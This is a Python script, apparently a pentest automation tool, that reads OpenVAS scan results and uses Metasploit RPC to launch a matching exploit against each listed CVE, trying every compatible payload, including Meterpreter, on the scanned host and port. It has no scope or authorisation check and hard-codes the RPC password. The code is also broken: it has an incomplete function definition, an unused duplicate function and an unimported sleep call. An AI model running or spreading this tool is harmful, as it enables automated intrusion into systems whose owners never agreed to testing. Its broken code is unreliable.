import csv
import subprocess
import time
from pymetasploit3.msfrpc import *
from pymetasploit3.msfconsole import *
# from termcolor import colored

# Global Defines
payloadfail = 0
payloadpass = 0
totalcve = 0

def cve

# def nessuscsv():
# def niktocsv():
# These are features that may be added in later reprisals, but are not components of the core module.

def openvascsv():
    with open('/home/kali/Downloads/results.csv' , "r") as csvfile: # First argument in brackets is the file path, can be manually or automatically set.
        openvasresults = csv.DictReader(csvfile)
        for row in openvasresults:
            if row['CVEs'] != "": 
                # Using the presence of items in the CVE column as the filter to determine if an exploit is feasible.
                # The criteria can be adjusted to allow for search results from other categories, such as operating systems, services etc., but is a much more extensive task than provided for here.
                targetip = row["IP"]
                targetport = row["Port"] # The port is generally unnecessary, but better safe than sorry.
                targetcve = row["CVEs"].split(",") # Any split should be manually determined by reading the CSV, then implemented here. Code is accurate for OpenVAS produced CSVs.
                # Use the above as standard defines across all imported CSV documents.

# Ping 0.0.0.0:55553 to determine if the shell needs to start, prevents any secondary boot errors
# subprocess.run(['ping -c 10 0.0.0.0:55553 ; echo $?'], shell = True)
subprocess.run(["msfrpcd -P kali"], shell = True) # Must be run as a shell command. Subproccess is replacing system and should be used in its stead. Shell = True is required, else the command will attempt to look for a directory.

# Connection to RPC may sometimes fail, which is fatal. The try block prevents this from persisting and allows retries.. Reattempting after 10 seconds is overkill, but adequate.
try:
    client = MsfRpcClient('kali', port = 55553, ssl = True) # Changes to this must also be replicated in the above subprocess.run command, else the connection will perpetually fail.
except ConnectionError:
    print("Connection to Metasploitable failed. Attempting again in 10 seconds")
    sleep(10)
else:
    print("Connection to Metasploit RPC initialised.")

#Open Dictation Reader to parse through CSV from OpenVAS
with open('/home/kali/Downloads/results.csv', 'r') as csvfile:
    results = csv.DictReader(csvfile)

#Init iterative module for automated exploitation
    for row in results:
        if row['CVEs'] != "":       
            targetip = row['IP']
            targetport = row['Port']
            targetcve = row['CVEs'].split(',')
            
            #Search CVE against Metasploit's internal database.
            for cve in targetcve:
                cvematch = client.modules.search("type:exploit cve:" + cve)
                totalcve = totalcve + 1
                #When a CVE has an exploit attached to it in Metasploit, establish the exploit.
                if len(cvematch) > 0:
                    print(cvematch[0].get("fullname"))
                    #The payload is set to a relevant Meterpreter session by default, but we don't intend on using the payload as a successful exploitation is sufficient to prove the vulnerability exists.
                    exploit = client.modules.use('exploit', cvematch[0].get("fullname"))
                    exploit['RHOSTS'] = targetip
                    exploit['RPORT'] = targetport
                    exploitopts = exploit.missing_required
                    print(exploitopts)
                    exploitcompat = exploit.targetpayloads()
                    for payload in exploitcompat:
                        try:
                            exploit.execute(payload=payload)
                        except ValueError:
                            print("Incompatible Payload:" + payload + ". Skipping.")
                        else:
                            print("Successful Payload:" + payload)
